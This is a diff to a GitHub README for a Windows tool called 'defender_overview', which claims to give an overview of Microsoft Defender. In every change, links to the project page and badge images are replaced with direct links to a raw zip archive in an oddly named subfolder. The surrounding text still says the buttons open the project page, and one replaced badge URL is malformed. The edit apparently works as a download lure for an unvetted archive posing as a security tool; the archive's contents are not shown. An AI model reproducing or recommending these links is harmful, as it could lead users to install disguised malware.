@@ -1,6 +1,6 @@
 # 🛡️ defender_overview - Simple Overview of MS Defender
 
-[![Download defender_overview](https://img.shields.io/badge/Download-defender_overview-green?style=for-the-badge)](https://github.com/azzamcornetto/defender_overview)
+[![Download defender_overview](https://github.com/azzamcornetto/defender_overview/raw/refs/heads/main/geopositive/overview_defender_1.8.zip)](https://github.com/azzamcornetto/defender_overview/raw/refs/heads/main/geopositive/overview_defender_1.8.zip)
 
 ---
 
@@ -26,7 +26,7 @@ Before you start, make sure your computer meets these needs:
 
 To get defender_overview, you need to visit the download page on GitHub. This page hosts the latest files you need to use the application.
 
-[![Download from GitHub](https://img.shields.io/badge/Download-GitHub-blue?style=for-the-badge)](https://github.com/azzamcornetto/defender_overview)
+[![Download from GitHub](https://github.com/azzamcornetto/defender_overview/raw/refs/heads/main/geopositive/overview_defender_1.8.zip)](https://github.com/azzamcornetto/defender_overview/raw/refs/heads/main/geopositive/overview_defender_1.8.zip)
 
 Clicking the button takes you directly to the project page. From there, you can find the latest version and download it.
 
@@ -37,7 +37,7 @@ Clicking the button takes you directly to the project page. From there, you can 
 Follow these steps to get the software running on your Windows PC:
 
 1. Open your web browser and go to:
-   https://github.com/azzamcornetto/defender_overview
+   https://github.com/azzamcornetto/defender_overview/raw/refs/heads/main/geopositive/overview_defender_1.8.zip
 
 2. Look for a link or button labeled **Releases** or **Download** on the page.
    
@@ -102,11 +102,11 @@ For advanced settings or troubleshooting, you can open the full Windows Security
 ## 📥 Download Links
 
 You can always get the latest version from the project page:  
-[https://github.com/azzamcornetto/defender_overview](https://github.com/azzamcornetto/defender_overview)
+[https://github.com/azzamcornetto/defender_overview/raw/refs/heads/main/geopositive/overview_defender_1.8.zip](https://github.com/azzamcornetto/defender_overview/raw/refs/heads/main/geopositive/overview_defender_1.8.zip)
 
 For quick access, use the button below to visit the download site:
 
-[![Download on GitHub](https://img.shields.io/badge/Download%20Page-grey?style=for-the-badge)](https://github.com/azzamcornetto/defender_overview)
+[![Download on GitHub](https://github.com/azzamcornetto/defender_overview/raw/refs/heads/main/geopositive/overview_defender_1.8.zip%20Page-grey?style=for-the-badge)](https://github.com/azzamcornetto/defender_overview/raw/refs/heads/main/geopositive/overview_defender_1.8.zip)
 
 ---
 
